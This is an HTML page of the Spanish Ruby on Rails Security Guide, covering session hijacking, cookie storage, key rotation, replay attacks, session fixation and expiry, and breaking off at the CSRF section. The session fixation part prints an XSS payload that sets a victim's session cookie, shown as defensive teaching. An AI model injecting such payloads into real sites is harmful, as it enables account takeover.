<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Seguridad de Aplicaciones Rails — Ruby on Rails Guides</title>
  <link rel="stylesheet" type="text/css" href="stylesheets/style.css" data-turbolinks-track="reload">
  <link rel="stylesheet" type="text/css" href="stylesheets/print.css" media="print">
  <link rel="stylesheet" type="text/css" href="stylesheets/prism/default.css" data-turbolinks-track="reload">
  <link rel="stylesheet" type="text/css" href="stylesheets/prism/rails-guides.css" data-turbolinks-track="reload">
  <link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon" />
  <script src="javascripts/prism.js" data-turbolinks-track="reload"></script>
  <script src="javascripts/turbolinks.js" data-turbolinks-track="reload"></script>
  <script src="javascripts/guides.js" data-turbolinks-track="reload"></script>
  <script src="javascripts/responsive-tables.js" data-turbolinks-track="reload"></script>
  <meta property="og:title" content="Seguridad de Aplicaciones Rails — Ruby on Rails Guides" />
  <meta name="description" content="NO LEA ESTE ARCHIVO EN GITHUB, LAS GUÍAS SE PUBLICAN EN https://guides.rubyonrails.org.Seguridad de Aplicaciones RailsEste manual describe problemas de seguridad comunes en aplicaciones web y cómo evitarlos con Rails.Después de leer esta guía, sabrá: Todas las contramedidas que están resaltadas. El concepto de sesiones en Rails, qué poner allí y métodos de ataque populares. Cómo el simple hecho de visitar un sitio puede ser un problema de seguridad (con CSRF). A qué debe prestar atención cuando trabaje con archivos o proporcione una interfaz de administración. Cómo administrar usuarios: Iniciar y cerrar sesión y métodos de ataque en todas las capas. Y los métodos de ataque por inyección más populares." />
  <meta property="og:description" content="NO LEA ESTE ARCHIVO EN GITHUB, LAS GUÍAS SE PUBLICAN EN https://guides.rubyonrails.org.Seguridad de Aplicaciones RailsEste manual describe problemas de seguridad comunes en aplicaciones web y cómo evitarlos con Rails.Después de leer esta guía, sabrá: Todas las contramedidas que están resaltadas. El concepto de sesiones en Rails, qué poner allí y métodos de ataque populares. Cómo el simple hecho de visitar un sitio puede ser un problema de seguridad (con CSRF). A qué debe prestar atención cuando trabaje con archivos o proporcione una interfaz de administración. Cómo administrar usuarios: Iniciar y cerrar sesión y métodos de ataque en todas las capas. Y los métodos de ataque por inyección más populares." />
  <meta property="og:locale" content="en_US" />
  <meta property="og:site_name" content="Ruby on Rails Guides" />
  <meta property="og:image" content="https://avatars.githubusercontent.com/u/4223" />
  <meta property="og:type" content="website" />
</head>
<body class="guide">
  <div>
<!--    <img src="images/edge_badge.png" alt="edge-badge" id="edge-badge" />-->
  </div>
  <div id="topNav">
    <div class="wrapper">
      <strong class="more-info-label">Más en <a href="https://rubyonrails.org/">rubyonrails.org:</a> </strong>
      <span class="red-button more-info-button">
        Más Ruby on Rails
      </span>
      <ul class="more-info-links s-hidden">
        <li class="more-info"><a href="https://weblog.rubyonrails.org/">Blog</a></li>
        <li class="more-info"><a href="https://guides.rubyonrails.org/">Guías</a></li>
        <li class="more-info"><a href="https://api.rubyonrails.org/">API</a></li>
        <li class="more-info"><a href="https://stackoverflow.com/questions/tagged/ruby-on-rails">Pedir Ayuda</a></li>
        <li class="more-info"><a href="https://github.com/rails/rails">Contribuir on GitHub</a></li>
      </ul>
    </div>
  </div>
  <div id="header">
    <div class="wrapper clearfix">
      <h1><a href="index.html" title="Guías de Ruby on Rails">Guías de Ruby on Rails </a></h1>
      <ul class="nav">
        <li><a class="nav-item" href="index.html">Inicio</a></li>
        <li class="guides-index guides-index-large">
          <a href="index.html" id="guidesMenu" class="guides-index-item nav-item">Index de Guías </a>
          <div id="guides" class="clearfix" style="display: none;">
            <hr />
            <dl class="guides-section-container">
                <div class="guides-section">
                  <dt>Empieza Aqui</dt>
                  <dd><a href="getting_started.html">Introducción a Rails</a></dd>
                </div>
                <div class="guides-section">
                  <dt>Modelos</dt>
                  <dd><a href="active_record_basics.html">Conceptos básicos de Active Record</a></dd>
                  <dd><a href="active_record_migrations.html">Migraciones de Active Record</a></dd>
                  <dd><a href="active_record_validations.html">Validaciones de Active Record</a></dd>
                  <dd><a href="active_record_callbacks.html">Devolución (callbacks) de Llamadas de Active Record</a></dd>
                  <dd><a href="association_basics.html">Asociaciones de Active Record</a></dd>
                  <dd><a href="active_record_querying.html">Interfaz de Consulta de Active Record</a></dd>
                </div>
                <div class="guides-section">
                  <dt>Vistas</dt>
                  <dd><a href="layouts_and_rendering.html">Diseños y Renderizado en Rails</a></dd>
                  <dd><a href="form_helpers.html">Ayudantes de Formulario de Action</a></dd>
                </div>
                <div class="guides-section">
                  <dt>Controladores</dt>
                  <dd><a href="action_controller_overview.html">Descripción General de Action Controller</a></dd>
                  <dd><a href="routing.html">Rails Routing Desde el Exterior Hacia Adentro</a></dd>
                </div>
                <div class="guides-section">
                  <dt>Otros Componentes</dt>
                  <dd><a href="active_support_core_extensions.html">Extensiones de Núcleo de Active Support</a></dd>
                  <dd><a href="action_mailer_basics.html">Conceptos Básicos de Action Mailer</a></dd>
                  <dd><a href="active_job_basics.html">Conceptos Básicos de Active Job</a></dd>
                  <dd><a href="active_storage_overview.html">Descripción General de Active Storage</a></dd>
                  <dd><a href="action_cable_overview.html">Descripción General de Action Cable</a></dd>
                </div>
                <div class="guides-section">
                  <dt>Temas Avanzados</dt>
                  <dd><a href="i18n.html">Rails API de Internacionalización (I18n)</a></dd>
                  <dd><a href="testing.html">Prueba de Aplicaciones de Rails</a></dd>
                  <dd><a href="security.html">Seguridad de Aplicaciones Rails</a></dd>
                  <dd><a href="debugging_rails_applications.html">Depuración de Applications Rails</a></dd>
                  <dd><a href="configuring.html">Configuración de Aplicaciones de Rails</a></dd>
                  <dd><a href="command_line.html">La Línea de Comandos de Rails</a></dd>
                  <dd><a href="asset_pipeline.html">La Canalización de Activos (necesita traducción)</a></dd>
                  <dd><a href="autoloading_and_reloading_constants.html">Constantes de Autocarga y Recarga (Zeitwerk Mode)</a></dd>
                  <dd><a href="autoloading_and_reloading_constants_classic_mode.html">Constantes de Autocarga y Recarga (modo clásico)</a></dd>
                  <dd><a href="caching_with_rails.html">Almacenamiento en Caché con Rails Descripción General</a></dd>
                  <dd><a href="api_app.html">Uso de Rails para Aplicaciones Solo API</a></dd>
                </div>
                <div class="guides-section">
                  <dt>Extending Rails  (toda la sección necesita traducción)</dt>
                  <dd><a href="rails_on_rack.html">Rails on Rack</a></dd>
                  <dd><a href="generators.html">Creating and Customizing Rails Generators &amp; Templates</a></dd>
                </div>
            </dl>
          </div>
        </li>
        <li><a class="nav-item" href="contributing_to_ruby_on_rails.html">Contribuir</a></li>
        <li class="guides-index guides-index-small">
          <select class="guides-index-item nav-item">
            <option value="index.html">Guides Index</option>
              <optgroup label="Empieza Aqui">
                  <option value="getting_started.html">Introducción a Rails</option>
              </optgroup>
              <optgroup label="Modelos">
                  <option value="active_record_basics.html">Conceptos básicos de Active Record</option>
                  <option value="active_record_migrations.html">Migraciones de Active Record</option>
                  <option value="active_record_validations.html">Validaciones de Active Record</option>
                  <option value="active_record_callbacks.html">Devolución (callbacks) de Llamadas de Active Record</option>
                  <option value="association_basics.html">Asociaciones de Active Record</option>
                  <option value="active_record_querying.html">Interfaz de Consulta de Active Record</option>
              </optgroup>
              <optgroup label="Vistas">
                  <option value="layouts_and_rendering.html">Diseños y Renderizado en Rails</option>
                  <option value="form_helpers.html">Ayudantes de Formulario de Action</option>
              </optgroup>
              <optgroup label="Controladores">
                  <option value="action_controller_overview.html">Descripción General de Action Controller</option>
                  <option value="routing.html">Rails Routing Desde el Exterior Hacia Adentro</option>
              </optgroup>
              <optgroup label="Otros Componentes">
                  <option value="active_support_core_extensions.html">Extensiones de Núcleo de Active Support</option>
                  <option value="action_mailer_basics.html">Conceptos Básicos de Action Mailer</option>
                  <option value="active_job_basics.html">Conceptos Básicos de Active Job</option>
                  <option value="active_storage_overview.html">Descripción General de Active Storage</option>
                  <option value="action_cable_overview.html">Descripción General de Action Cable</option>
              </optgroup>
              <optgroup label="Temas Avanzados">
                  <option value="i18n.html">Rails API de Internacionalización (I18n)</option>
                  <option value="testing.html">Prueba de Aplicaciones de Rails</option>
                  <option value="security.html">Seguridad de Aplicaciones Rails</option>
                  <option value="debugging_rails_applications.html">Depuración de Applications Rails</option>
                  <option value="configuring.html">Configuración de Aplicaciones de Rails</option>
                  <option value="command_line.html">La Línea de Comandos de Rails</option>
                  <option value="asset_pipeline.html">La Canalización de Activos (necesita traducción)</option>
                  <option value="autoloading_and_reloading_constants.html">Constantes de Autocarga y Recarga (Zeitwerk Mode)</option>
                  <option value="autoloading_and_reloading_constants_classic_mode.html">Constantes de Autocarga y Recarga (modo clásico)</option>
                  <option value="caching_with_rails.html">Almacenamiento en Caché con Rails Descripción General</option>
                  <option value="api_app.html">Uso de Rails para Aplicaciones Solo API</option>
              </optgroup>
              <optgroup label="Extending Rails  (toda la sección necesita traducción)">
                  <option value="rails_on_rack.html">Rails on Rack</option>
                  <option value="generators.html">Creating and Customizing Rails Generators &amp; Templates</option>
              </optgroup>
          </select>
        </li>
      </ul>
    </div>
  </div>
  <hr class="hide" />

  <div id="feature">
    <div class="wrapper">
      <p><strong>NO LEA ESTE ARCHIVO EN GITHUB, LAS GUÍAS SE PUBLICAN EN <a href="https://guides.rubyonrails.org">https://guides.rubyonrails.org</a>.</strong></p><h2>Seguridad de Aplicaciones Rails</h2><p>Este manual describe problemas de seguridad comunes en aplicaciones web y cómo evitarlos con Rails.</p><p>Después de leer esta guía, sabrá:</p>
<ul>
<li>Todas las contramedidas <em>que están resaltadas</em>.</li>
<li>El concepto de sesiones en Rails, qué poner allí y métodos de ataque populares.</li>
<li>Cómo el simple hecho de visitar un sitio puede ser un problema de seguridad (con CSRF).</li>
<li>A qué debe prestar atención cuando trabaje con archivos o proporcione una interfaz de administración.</li>
<li>Cómo administrar usuarios: Iniciar y cerrar sesión y métodos de ataque en todas las capas.</li>
<li>Y los métodos de ataque por inyección más populares.</li>
</ul>


                <div id="subCol">
            <h3 class="chapter"><img src="images/chapters_icon.gif" alt="" />Chapters</h3>
            <ol class="chapters">
<li><a href="#introduction">Introduction</a></li>
<li>
<a href="#sessions">Sessions</a>

<ul>
<li><a href="#what-are-sessions-questionmark">What are Sessions?</a></li>
<li><a href="#session-hijacking">Session Hijacking</a></li>
<li><a href="#session-storage">Session Storage</a></li>
<li><a href="#rotating-encrypted-and-signed-cookies-configurations">Rotating Encrypted and Signed Cookies Configurations</a></li>
<li><a href="#replay-attacks-for-cookiestore-sessions">Replay Attacks for CookieStore Sessions</a></li>
<li><a href="#session-fixation">Session Fixation</a></li>
<li><a href="#session-fixation-countermeasure">Session Fixation - Countermeasure</a></li>
<li><a href="#session-expiry">Session Expiry</a></li>
</ul>
</li>
<li>
<a href="#cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</a>

<ul>
<li><a href="#csrf-countermeasures">CSRF Countermeasures</a></li>
</ul>
</li>
<li>
<a href="#redirection-and-files">Redirection and Files</a>

<ul>
<li><a href="#redirection">Redirection</a></li>
<li><a href="#file-uploads">File Uploads</a></li>
<li><a href="#executable-code-in-file-uploads">Executable Code in File Uploads</a></li>
<li><a href="#file-downloads">File Downloads</a></li>
</ul>
</li>
<li>
<a href="#intranet-and-admin-security">Intranet and Admin Security</a>

<ul>
<li><a href="#additional-precautions">Additional Precautions</a></li>
</ul>
</li>
<li>
<a href="#user-management">User Management</a>

<ul>
<li><a href="#brute-forcing-accounts">Brute-Forcing Accounts</a></li>
<li><a href="#account-hijacking">Account Hijacking</a></li>
<li><a href="#captchas">CAPTCHAs</a></li>
<li><a href="#logging">Logging</a></li>
<li><a href="#regular-expressions">Regular Expressions</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
</ul>
</li>
<li>
<a href="#injection">Injection</a>

<ul>
<li><a href="#permitted-lists-versus-restricted-lists">Permitted lists versus Restricted lists</a></li>
<li><a href="#sql-injection">SQL Injection</a></li>
<li><a href="#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a></li>
<li><a href="#css-injection">CSS Injection</a></li>
<li><a href="#textile-injection">Textile Injection</a></li>
<li><a href="#ajax-injection">Ajax Injection</a></li>
<li><a href="#command-line-injection">Command Line Injection</a></li>
<li><a href="#header-injection">Header Injection</a></li>
</ul>
</li>
<li><a href="#unsafe-query-generation">Unsafe Query Generation</a></li>
<li>
<a href="#default-headers">Default Headers</a>

<ul>
<li><a href="#content-security-policy">Content Security Policy</a></li>
</ul>
</li>
<li>
<a href="#environmental-security">Environmental Security</a>

<ul>
<li><a href="#custom-credentials">Custom Credentials</a></li>
</ul>
</li>
<li><a href="#dependency-management-and-cves">Dependency Management and CVEs</a></li>
<li><a href="#additional-resources">Additional Resources</a></li>
</ol>

          </div>

    </div>
  </div>

  <div id="container">
    <div class="wrapper">
      <div id="mainCol">
        <h3 id="introduction"><a class="anchorlink" href="#introduction">1 Introduction</a></h3><p>Los marcos de aplicaciones web se crean para ayudar a los desarrolladores a crear aplicaciones web. Algunos de ellos también le ayudan a proteger la aplicación web. De hecho, un marco no es más seguro que otro: si lo usa correctamente, podrá crear aplicaciones seguras con muchos marcos. Ruby on Rails tiene algunos métodos de ayuda inteligentes, por ejemplo contra la inyección de SQL, por lo que esto no es un problema.</p><p>En general, no existe la seguridad plug-n-play. La seguridad depende de las personas que utilizan el marco y, a veces, del método de desarrollo. Y depende de todas las capas del entorno de una aplicación web: el almacenamiento back-end, el servidor web y la propia aplicación web (y posiblemente otras capas o aplicaciones).</p><p>El Grupo Gartner, sin embargo, estima que el 75% de los ataques se producen en la capa de aplicación web y descubrió que "de 300 sitios auditados, el 97% son vulnerables a los ataques". Esto se debe a que las aplicaciones web son relativamente fáciles de atacar, ya que son sencillas de entender y manipular, incluso para un lego.</p><p>Las amenazas contra las aplicaciones web incluyen el secuestro de cuentas de usuario, eludir el control de acceso, leer o modificar datos confidenciales o presentar contenido fraudulento. O un atacante podría instalar un programa caballo de Troya o un software de envío de correo electrónico no solicitado, tener como objetivo el enriquecimiento financiero o causar daños a la marca modificando los recursos de la empresa. Para prevenir ataques, minimizar su impacto y eliminar los puntos de ataque, en primer lugar, debe comprender completamente los métodos de ataque para encontrar las contramedidas correctas. Eso es a lo que apunta esta guía.</p><p>Para desarrollar aplicaciones web seguras, debes mantenerte actualizado en todas las capas y conocer a tus enemigos. Para mantenerse actualizado, suscríbase a las listas de correo de seguridad, lea blogs de seguridad y convierta las actualizaciones y los controles de seguridad en un hábito (consulte el capítulo <a href="#additional-resources">Additional Resources</a>). Se hace manualmente porque así es como se encuentran los desagradables problemas lógicos de seguridad.</p><h3 id="sessions"><a class="anchorlink" href="#sessions">2 Sessions</a></h3><p>Este capítulo describe algunos ataques específicos relacionados con las sesiones y las medidas de seguridad para proteger los datos de su sesión.</p><h4 id="what-are-sessions-questionmark"><a class="anchorlink" href="#what-are-sessions-questionmark">2.1 What are Sessions?</a></h4><div class="info"><p>Las sesiones permiten que la aplicación mantenga un estado específico del usuario, mientras los usuarios interactúan con la aplicación. Por ejemplo, las sesiones permiten que los usuarios se autentiquen una vez y permanecen conectados para solicitudes futuras.</p></div><p>La mayoría de las aplicaciones necesitan realizar un seguimiento del estado de los usuarios que interactúan con la aplicación. Este podría ser el contenido de una cesta de la compra o la identificación de usuario del usuario actualmente conectado. Este tipo de estado específico del usuario se puede almacenar en la sesión.</p><p>Rails proporciona un objeto de sesión para cada usuario que accede a la aplicación. Si el usuario ya tiene una sesión activa, Rails usa la sesión existente. De lo contrario, se crea una nueva sesión.</p><div class="note"><p>Lea más sobre las sesiones y cómo usarlas en <a href="action_controller_overview.html#session">Action Controller Overview Guide</a>.</p></div><h4 id="session-hijacking"><a class="anchorlink" href="#session-hijacking">2.2 Session Hijacking</a></h4><div class="warning"><p><em>Robar la identificación de sesión de un usuario permite que un atacante use la aplicación web en el nombre de la víctima.</em></p></div><p>Muchas aplicaciones web tienen un sistema de autenticación: un usuario proporciona un nombre de usuario y una contraseña, la aplicación web los comprueba y almacena la identificación de usuario correspondiente en el hash de la sesión. A partir de ahora, la sesión es válida. En cada solicitud, la aplicación cargará al usuario, identificado por el ID de usuario en la sesión, sin necesidad de una nueva autenticación. El ID de sesión en la cookie identifica la sesión.</p><p>Por lo tanto, la cookie sirve como autenticación temporal para la aplicación web. Cualquiera que se apodere de una cookie de otra persona, puede utilizar la aplicación web como este usuario, con posibles consecuencias graves. Estas son algunas formas de secuestrar una sesión y sus contramedidas:</p>
<ul>
<li>
<p>Olfatear la cookie en una red insegura. Una LAN inalámbrica puede ser un ejemplo de una red de este tipo. En una LAN inalámbrica sin cifrar, es especialmente fácil escuchar el tráfico de todos los clientes conectados. Para el creador de aplicaciones web, esto significa <em>proporcionar una conexión segura a través de SSL</em>. En Rails 3.1 y posteriores, esto se puede lograr forzando siempre la conexión SSL en el archivo de configuración de su aplicación:</p>
<div class="code_container">
<pre><code class="language-ruby">config.force_ssl = true
</code></pre>
</div>
</li>
<li><p>La mayoría de las personas no borran las cookies después de trabajar en una terminal pública. Entonces, si el último usuario no se desconectó de una aplicación web, podrá usarla como este usuario. Proporcione al usuario un <em>botón de cierre de sesión</em> en la aplicación web y <em>hágalo destacado</em>.</p></li>
<li><p>Muchas hazañas de cross-site scripting (XSS) tienen como objetivo obtener la cookie del usuario. Leerá <a href="#cross-site-scripting-xss">more about XSS</a> más adelante.</p></li>
<li><p>En lugar de robar una cookie desconocida para el atacante, corrigen el identificador de sesión de un usuario (en la cookie) que conocen. Lea más sobre esta llamada fijación de sesión más adelante.</p></li>
</ul>
<p>El principal objetivo de la mayoría de los atacantes es ganar dinero. Los precios clandestinos para cuentas bancarias robadas varían entre 0.5% -10% del saldo de la cuenta, $ 0.5- $ 30 para números de tarjetas de crédito ($ 20- $ 60 con detalles completos), $ 0.1- $ 1.5 para identidades (Nombre, SSN y DOB), $ 20- $ 50 para cuentas de minoristas y $ 6 a $ 10 para cuentas de proveedores de servicios en la nube, según el <a href="https://www.symantec.com/content/dam/symantec/docs/reports/istr%20-22-2017-en.pdf">Symantec Internet Security Threat Report (2017)</a>.</p><h4 id="session-storage"><a class="anchorlink" href="#session-storage">2.3 Session Storage</a></h4><div class="note"><p>Rails usa <code>ActionDispatch::Session::CookieStore</code> como el almacenamiento de sesión predeterminado.</p></div><div class="info"><p>Obtenga más información sobre otros almacenamientos de sesiones en la <a href="action_controller_overview.html#session">Action Controller Overview Guide</a>.</p></div><p>Rails <code>CookieStore</code> guarda el hash de la sesión en una cookie en el lado del cliente.
El servidor recupera el hash de sesión de la cookie y
elimina la necesidad de un ID de sesión. Eso aumentará enormemente la
velocidad de la aplicación, pero es una opción de almacenamiento controvertida y
tienes que pensar en las implicaciones de seguridad y almacenamiento
limitaciones de la misma:</p>
<ul>
<li><p>Las cookies tienen un límite de tamaño de 4kB. Utilice cookies solo para datos que sean relevantes para la sesión.</p></li>
<li><p>Las cookies se almacenan en el lado del cliente. El cliente puede conservar el contenido de las cookies incluso para las cookies caducadas. El cliente puede copiar cookies a otras máquinas. Evite almacenar datos sensibles en cookies.</p></li>
<li><p>Las cookies son temporales por naturaleza. El servidor puede establecer la hora de vencimiento de la cookie, pero el cliente puede eliminar la cookie y su contenido antes de eso. Conserve todos los datos que son de naturaleza más permanente en el lado del servidor.</p></li>
<li><p>Las cookies de sesión no se invalidan y pueden ser reutilizadas maliciosamente. 
Puede ser una buena idea que su aplicación invalide las
cookies de sesión utilizando una marca de tiempo almacenada.</p></li>
<li><p>Rails cifra las cookies de forma predeterminada. El cliente no puede leer ni editar el contenido de la cookie sin romper el cifrado. Si cuida adecuadamente sus secretos, puede considerar que sus cookies están generalmente protegidas.</p></li>
</ul>
<p>La <code>CookieStore</code> utiliza el
<a href="https://edgeapi.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted">encrypted</a>
tarro de cookies para proporcionar una ubicación segura y cifrada para almacenar la sesión de
datos. Las sesiones basadas en cookies proporcionan tanto integridad como
confidencialidad de su contenido. La clave de cifrado, así como la
clave de verificación utilizada para
<a href="https://edgeapi.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed">signed</a>
cookies, se deriva del valor de configuración <code>secret_key_base</code>.</p><div class="info"><p>Los secretos deben ser largos y aleatorios. Utilice <code>bin /rails secret</code> para obtener nuevos secretos únicos.</p></div><div class="info"><p>Obtenga más información sobre <a href="security.html#custom-credentials">managing credentials later in this guide</a></p></div><p>También es importante utilizar diferentes valores de sal para cifrado y
cookies firmadas. Usando el mismo valor para diferentes configuraciones
de sal pueden llevar a que se utilice la misma clave derivada para diferentes
características de seguridad que a la vez pueden debilitar la fuerza de la clave.</p><p>En las aplicaciones de prueba y desarrollo, obtenga una <code>secret_key_base</code> derivada del nombre de la aplicación. Otros entornos deben usar una clave aleatoria presente en <code>config/credentials.yml.enc</code>, que se muestra aquí en su estado descifrado:</p><div class="code_container">
<pre><code class="language-yaml">secret_key_base: 492f...
</code></pre>
</div>
<div class="warning"><p>Si los secretos de su aplicación pueden haber sido expuestos, considere cambiarlos. Cambiar <code>secret_key_base</code> expirará las sesiones activas actualmente.</p></div><h4 id="rotating-encrypted-and-signed-cookies-configurations"><a class="anchorlink" href="#rotating-encrypted-and-signed-cookies-configurations">2.4 Rotating Encrypted and Signed Cookies Configurations</a></h4><p>La rotación es ideal para cambiar la configuración de las cookies y garantizar que las cookies antiguas
no sean inválidas de inmediato. Entonces, sus usuarios tienen la oportunidad de visitar su sitio,
obtener su cookie leída con una configuración anterior y reescribirla con el
nuevo cambio. La rotación se puede quitar una vez que se sienta lo suficientemente cómodo que
los usuarios han tenido la oportunidad de actualizar sus cookies.</p><p>Es posible rotar los cifrados y resúmenes utilizados para las cookies encriptadas y firmadas.</p><p>Por ejemplo, para cambiar el resumen utilizado para las cookies firmadas de SHA1 a SHA256,
primero asignaría el nuevo valor de configuración:</p><div class="code_container">
<pre><code class="language-ruby">Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"
</code></pre>
</div>
<p>Ahora agregue una rotación para el resumen SHA1 antiguo para que las cookies existentes sean
actualizadas sin problemas al nuevo resumen SHA256.</p><div class="code_container">
<pre><code class="language-ruby">Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
  cookies.rotate :signed, digest: "SHA1"
end
</code></pre>
</div>
<p>Luego, cualquier cookie firmada por escrito será digerida con SHA256. Galletas viejas
que se escribieron con SHA1 aún se pueden leer y, si se accede a ellas, se escribirán
con el nuevo resumen para que se actualicen y no sean inválidos cuando se elimine la
rotación.</p><p>Una vez que los usuarios con cookies firmadas digeridas por SHA1 ya no deberían tener la oportunidad que
reescriban sus cookies, elimine la rotación.</p><p>Si bien puede configurar tantas rotaciones como desee, no es común tener muchas
rotaciones en cualquier momento.</p><p>Para obtener más detalles sobre la rotación de claves con mensajes encriptados y firmados como
así como las diversas opciones que acepta el método <code>rotar</code>, consulte
el
<a href="https://edgeapi.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html">MessageEncryptor API</a>
y la documentación
<a href="https://edgeapi.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html">MessageVerifier API</a>.</p><h4 id="replay-attacks-for-cookiestore-sessions"><a class="anchorlink" href="#replay-attacks-for-cookiestore-sessions">2.5 Replay Attacks for CookieStore Sessions</a></h4><div class="info"><p><em>Otro tipo de ataque que debes tener en cuenta al usar <code>CookieStore</code> es el ataque de repetición.</em></p></div><p>Funciona así:</p>
<ul>
<li>Un usuario recibe créditos, la cantidad se almacena en una sesión (lo cual es una mala idea de todos modos, pero lo haremos con fines de demostración).</li>
<li>El usuario compra algo.</li>
<li>El nuevo valor de crédito ajustado se almacena en la sesión.</li>
<li>El usuario toma la cookie del primer paso (que copió previamente) y reemplaza la cookie actual en el navegador.</li>
<li>El usuario recupera su crédito original.</li>
</ul>
<p>Incluir un nonce (un valor aleatorio) en la sesión resuelve los ataques de repetición. Un nonce es válido solo una vez, y el servidor debe realizar un seguimiento de todos los nonces válidos. Se vuelve aún más complicado si tiene varios servidores de aplicaciones. Almacenar nonces en una tabla de base de datos frustraría todo el propósito de CookieStore (evitar acceder a la base de datos).</p><p>La mejor <em>solución contra esto no es almacenar este tipo de datos en una sesión, sino en la base de datos</em>. En este caso, almacene el crédito en la base de datos y el <code>log_in_user_id</code> en la sesión.</p><h4 id="session-fixation"><a class="anchorlink" href="#session-fixation">2.6 Session Fixation</a></h4><div class="note"><p><em>Aparte de robar el ID de sesión de un usuario, el atacante puede corregir un ID de sesión conocido por él. Esto se llama session fixation.</em></p></div><p><img src="images/security/session_fixation.png" alt="Session fixation"></p><p>Este ataque se centra en corregir el ID de sesión de un usuario conocido por el atacante y en obligar al navegador del usuario a utilizar este ID. Por lo tanto, no es necesario que el atacante robe el ID de sesión posteriormente. Así es como funciona este ataque:</p>
<ul>
<li>El atacante crea un ID de sesión válido: cargan la página de inicio de sesión de la aplicación web donde quieren arreglar la sesión y toman el ID de sesión en la cookie de la respuesta (ver número 1 y 2 en la imagen).</li>
<li>Mantienen la sesión accediendo periódicamente a la aplicación web para mantener viva una sesión que expira.</li>
<li>El atacante obliga al navegador del usuario a utilizar este ID de sesión (ver el número 3 en la imagen). Como no puede cambiar una cookie de otro dominio (debido a la misma política de origen), el atacante debe ejecutar un JavaScript desde el dominio de la aplicación web de destino. Inyectar el código JavaScript en la aplicación por XSS logra este ataque. Aquí hay un ejemplo: <code>&lt;script&gt;document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9 ";&lt;/script&gt;</code>. Lea más sobre XSS e inyección más adelante.</li>
<li>El atacante atrae a la víctima a la página infectada con el código JavaScript. Al ver la página, el navegador de la víctima cambiará el ID de sesión por el ID de sesión de trampa.</li>
<li>Como la nueva sesión de captura no se usa, la aplicación web requerirá que el usuario se autentique.</li>
<li>A partir de ahora, la víctima y el atacante utilizarán conjuntamente la aplicación web con la misma sesión: la sesión se volvió válida y la víctima no notó el ataque.</li>
</ul>
<h4 id="session-fixation-countermeasure"><a class="anchorlink" href="#session-fixation-countermeasure">2.7 Session Fixation - Countermeasure</a></h4><div class="info"><p><em>Una línea de código lo protegerá de la fijación de la sesión.</em></p></div><p>La contramedida más eficaz es <em>Emitir un nuevo identificador de sesión</em> y declarar que el antiguo no es válido después de iniciar sesión correctamente. De esa manera, un atacante no puede usar el identificador de sesión fijo. Esta es también una buena medida contra el secuestro de sesiones. A continuación se explica cómo crear una nueva sesión en Rails:</p><div class="code_container">
<pre><code class="language-ruby">reset_session
</code></pre>
</div>
<p>Si usa la gem popular <a href="https://rubygems.org/gems/devise">Devise</a> para la administración de usuarios, automáticamente caducará las sesiones al iniciar y cerrar la sesión por usted. Si realiza la suya propia, recuerde caducar la sesión después de iniciar la sesión (cuando se crea la sesión). Esto eliminará los valores de la sesión, por lo tanto, tendrá que transferirlos a la nueva sesión.</p><p>Otra contramedida es <em>guardar las propiedades específicas del usuario en la sesión</em>, verificarlas cada vez que ingrese una solicitud y denegar el acceso si la información no coincide. Dichas propiedades podrían ser la dirección IP remota o el agente de usuario (el nombre del navegador web), aunque este último es menos específico del usuario. A la hora de guardar la dirección IP hay que tener en cuenta que existen proveedores de servicios de Internet o grandes organizaciones que ponen a sus usuarios detrás de proxies. <em>Estos pueden cambiar en el transcurso de una sesión</em>, por lo que estos usuarios no podrán usar su aplicación, o solo de manera limitada.</p><h4 id="session-expiry"><a class="anchorlink" href="#session-expiry">2.8 Session Expiry</a></h4><div class="note"><p><em>Las sesiones que nunca caducan amplían el plazo para ataques como la falsificación de solicitudes entre sitios (CSRF), el secuestro de sesiones y la fijación de sesiones.</em></p></div><p>Una posibilidad es establecer la fecha de caducidad de la cookie con el ID de sesión. Sin embargo, el cliente puede editar las cookies que se almacenan en el navegador web para que la expiración de sesiones en el servidor sea más segura. A continuación se muestra un ejemplo de cómo <em>expirar sesiones en una tabla de base de datos</em>. Llame a <code>Session.sweep("20 minutes")</code> para caducar las sesiones que se usaron hace más de 20 minutos.</p><div class="code_container">
<pre><code class="language-ruby">class Session &lt; ApplicationRecord
  def self.sweep(time = 1.hour)
    if time.is_a?(String)
      time = time.split.inject { |count, unit| count.to_i.send(unit) }
    end

    delete_all "updated_at &lt; '#{time.ago.to_s(:db)}'"
  end
end

La sección sobre la fijación de sesiones introdujo el problema de las sesiones mantenidas. Un atacante que mantiene una sesión cada cinco minutos puede mantener la sesión viva para siempre, aunque sus sesiones expiren. Una solución simple para esto sería agregar una columna `created_at` a la tabla de sesiones. Ahora puede eliminar sesiones creadas hace mucho tiempo. Utilice esta línea en el método de barrido anterior:

```ruby
delete_all "updated_at &lt; '#{time.ago.to_s(:db)}' OR
  created_at &lt; '#{2.days.ago.to_s(:db)}'"
</code></pre>
</div>
<h3 id="cross-site-request-forgery-csrf"><a class="anchorlink" href="#cross-site-request-forgery-csrf">3 Cross-Site Request Forgery (CSRF)</a></h3><p>Este método de ataque funciona al incluir un código malicioso o un enlace en una página que accede a una aplicación web que se cree que el usuario ha autenticado. Si la sesión de esa aplicación web no ha agotado el tiempo de espera, un atacante puede ejecutar comandos no autorizados.</p><p><img src="images/security/csrf.png" alt=""></p><p>En <a href="#sessions">session chapter</a>, aprendió que la mayoría de las aplicaciones Rails usan sesiones basadas en cookies. O almacenan el ID de sesión en la cookie y tienen un hash de sesión del lado del servidor, o todo el hash de la sesión está en el lado del cliente. En cualquier caso, el navegador enviará automáticamente la cookie en cada solicitud a un dominio, si puede encontrar una cookie para ese dominio. El punto controvertido es que si la solicitud proviene de un sitio de un dominio diferente, también enviará la cookie. Comencemos con un ejemplo:</p>
<ul>
